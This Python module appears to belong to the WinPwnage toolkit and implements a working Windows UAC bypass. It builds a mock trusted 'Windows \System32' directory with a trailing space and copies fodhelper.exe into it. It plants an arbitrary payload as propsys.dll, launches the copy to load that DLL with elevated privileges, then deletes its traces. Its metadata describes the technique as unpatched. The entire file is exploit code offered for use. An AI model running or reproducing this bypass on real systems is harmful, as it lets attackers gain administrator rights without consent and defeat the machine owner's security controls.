import os
import time
import shutil
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e 

fodhelper_dll_info = {
	"Description": "Bypass UAC using fodhelper (DLL) by mocking trusted directories",
	"Id": "23",
	"Type": "UAC bypass",
	"Fixed In": "999999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "fodhelper_dll",
	"Function Payload": True,
}


def fodhelper_dll(payload):
	if payloads().dll(payload):
		try:
			os.mkdir("\\\?\\{} ".format(information().windows_directory()))
		except Exception as error:
			print_error("Unable to create mock WINDIR directory")
			return False

		try:
			os.mkdir("\\\?\\{} \\System32".format(information().windows_directory()))
		except Exception as error:
			print_error("Unable to create mock SYSTEM32 directory")
			return False
		else:
			print_success("Successfully created mock directories (\\\?\\{} \\System32)".format(information().windows_directory()))

		time.sleep(5)

		try:
			shutil.copy(os.path.join(information().system_directory(),"fodhelper.exe"),"\\\?\\{} \\System32\\fodhelper.exe".format(information().windows_directory()))
		except Exception as error:
			print_error("Unable to make copy of fodhelper.exe")
			return False
		else:
			print_success("Successfully created a copy of fodhelper.exe to our directory")
			
		try:
			payload_data = open(os.path.join(payload), "rb").read()
		except Exception as error:
			print_error("Unable to read payload data")
			return False

		try:
			dll_file = open("\\\?\\{} \\System32\\propsys.dll".format(information().windows_directory()), "wb")
			dll_file.write(payload_data)
			dll_file.close()
		except Exception as error:
			print_error("Unable to save our payload to directory")
			return False
		else:
			print_success("Successfully dropped our dll file")

		time.sleep(5)

		if process().create("\\\?\\{} \\System32\\fodhelper.exe".format(information().windows_directory())):
			print_success("Successfully spawned process (\\\?\\{} \\System32\\fodhelper.exe)".format(information().windows_directory()))
		else:
			print_error("Unable to spawn process")
			return False

		time.sleep(5)

		try:
			shutil.rmtree("\\\?\\{} ".format(information().windows_directory()))
		except Exception as error:
			print_error("Unable to clean, manually cleaning is needed!")
			return False
		else:
			print_success("Successfully cleaned up, enjoy!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
